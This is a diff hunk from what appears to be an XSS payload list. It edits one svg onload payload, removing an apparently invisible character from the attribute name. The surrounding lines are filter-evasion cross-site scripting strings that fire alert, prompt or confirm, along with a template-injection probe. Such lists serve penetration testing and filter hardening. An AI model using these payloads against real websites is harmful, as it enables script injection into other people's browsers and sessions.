@@ -41,7 +41,7 @@ a onclick="alert(1)">XSS</a>
 "'`//><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE"))>
 <Svg%K9OnLoad=%7Krompt%6K1%6K>
 '"><svg/onload=prompt('XSS');>{{7*7}}
-<svg onxss=() onload​='setTimeout`alert\x281\x29`'>
+<svg onxss=() onload='setTimeout`alert\x281\x29`'>
 <acronym><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
 <bgsound><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
 <xmp><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
